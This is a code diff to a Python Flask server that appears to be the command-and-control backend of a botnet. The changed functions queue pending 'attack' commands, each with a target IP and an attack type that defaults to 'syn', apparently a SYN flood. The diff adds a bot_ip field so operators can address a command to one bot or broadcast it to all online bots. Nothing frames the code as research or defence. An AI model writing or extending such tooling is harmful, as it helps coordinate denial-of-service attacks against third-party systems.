@@ -366,14 +366,15 @@ def get_command(bot_ip):
             conn = db_manager.get_connection()
             cursor = conn.cursor()
             
-            # Get the latest pending command
+            # Get the latest pending command for this specific bot
             cursor.execute('''
                 SELECT id, command, target_ip, attack_type
                 FROM commands
-                WHERE status = 'pending'
+                WHERE (bot_ip = ? OR bot_ip IS NULL)
+                AND status = 'pending'
                 ORDER BY id DESC
                 LIMIT 1
-            ''')
+            ''', (bot_ip,))
             
             command = cursor.fetchone()
             
@@ -411,6 +412,7 @@ def start_attack():
         data = request.get_json()
         target = data.get('target')
         attack_type = data.get('attack_type', 'syn')
+        bot_ip = data.get('bot_ip')  # Get the specific bot IP
         
         if not target:
             return jsonify({'error': 'Target IP required'}), 400
@@ -459,10 +461,20 @@ def start_attack():
         with db_manager.db_lock:
             conn = db_manager.get_connection()
             cursor = conn.cursor()
-            cursor.execute('''
-                INSERT INTO commands (command, target_ip, attack_type, status)
-                VALUES (?, ?, ?, 'pending')
-            ''', (json.dumps(command), target, attack_type))
+            
+            # If bot_ip is specified, create command for that specific bot
+            if bot_ip:
+                cursor.execute('''
+                    INSERT INTO commands (command, target_ip, attack_type, status, bot_ip)
+                    VALUES (?, ?, ?, 'pending', ?)
+                ''', (json.dumps(command), target, attack_type, bot_ip))
+            else:
+                # Create command for all online bots
+                cursor.execute('''
+                    INSERT INTO commands (command, target_ip, attack_type, status)
+                    VALUES (?, ?, ?, 'pending')
+                ''', (json.dumps(command), target, attack_type))
+            
             command_id = cursor.lastrowid
             conn.commit()
             conn.close()
